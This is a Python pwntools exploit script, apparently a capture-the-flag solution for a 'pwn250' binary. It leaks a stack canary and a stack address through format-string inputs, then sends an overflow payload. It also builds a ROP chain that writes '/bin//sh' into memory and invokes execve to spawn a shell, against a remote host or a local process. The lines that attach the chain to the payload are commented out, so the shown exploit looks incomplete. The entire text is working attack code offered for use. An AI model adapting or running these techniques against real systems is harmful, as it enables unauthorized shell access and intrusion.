#!/usr/bin/env python

from pwn import *
import sys

p = ''
p += p64(0x0000000000401937) # pop rsi ; ret
p += p64(0x00000000006cb080) # @ .data
p += p64(0x0000000000480306) # pop rax ; pop rdx ; pop rbx ; ret
p += '/bin//sh'
p += p64(0x4141414141414141) # padding
p += p64(0x4141414141414141) # padding
p += p64(0x000000000047bdb1) # mov qword ptr [rsi], rax ; ret
p += p64(0x0000000000401937) # pop rsi ; ret
p += p64(0x00000000006cb088) # @ .data + 8
p += p64(0x0000000000425faf) # xor rax, rax ; ret
p += p64(0x000000000047bdb1) # mov qword ptr [rsi], rax ; ret
p += p64(0x0000000000401816) # pop rdi ; ret
p += p64(0x00000000006cb080) # @ .data
p += p64(0x0000000000401937) # pop rsi ; ret
p += p64(0x00000000006cb088) # @ .data + 8
p += p64(0x00000000004427a6) # pop rdx ; ret
p += p64(0x00000000006cb088) # @ .data + 8
p += p64(0x0000000000425faf) # xor rax, rax ; ret
p += p64(0x000000000046e2d0) # : mov rax, 7 ; ret
p += p64(0x000000000046e250) # : add rax, 3 ; ret
p += p64(0x000000000046e250) # : add rax, 3 ; ret
p += p64(0x000000000046e250) # : add rax, 3 ; ret
p += p64(0x000000000046e250) # : add rax, 3 ; ret
p += p64(0x000000000046e250) # : add rax, 3 ; ret
p += p64(0x000000000046e250) # : add rax, 3 ; ret
p += p64(0x000000000046e250) # : add rax, 3 ; ret
p += p64(0x000000000046e250) # : add rax, 3 ; ret
p += p64(0x000000000046e250) # : add rax, 3 ; ret
p += p64(0x000000000046e250) # : add rax, 3 ; ret
p += p64(0x000000000046e250) # : add rax, 3 ; ret
p += p64(0x000000000046e250) # : add rax, 3 ; ret
p += p64(0x000000000046e250) # : add rax, 3 ; ret
p += p64(0x000000000046e250) # : add rax, 3 ; ret
p += p64(0x000000000046e250) # : add rax, 3 ; ret
p += p64(0x000000000046e250) # : add rax, 3 ; ret
p += p64(0x000000000046e250) # : add rax, 3 ; ret
p += p64(0x000000000046e240) # : add rax, 1 ; ret
p += p64(0x000000000046efa5) # syscall ; ret

def exploit(r):
	r.recvuntil('Enter a category:')
	r.sendline('%71$lx')
	canary = int(r.recvline().strip(), 16)
	log.info("Canary: " + hex(canary))
	r.recvuntil('What?')

	r.sendline("%44$lx")
	stack = int(r.recvline().strip(), 16)
	log.info("Stack: " + hex(stack))
	r.recvuntil('What?')

	r.sendline("D")

	# (canary ^ key) == (loc1 ^ 0xdeadbeef)

	r.recvuntil('Smartitude is a choice ...')

	payload = "Z" * 16
	payload += p64(0xdeadbeef)
	payload += p64(canary)
#	payload += p64(0x41)
#	payload += p

	r.sendline(payload)

	r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/vagrant/dctf/pwn250/250.bin'])
        print util.proc.pidof(r)
        pause()
        exploit(r)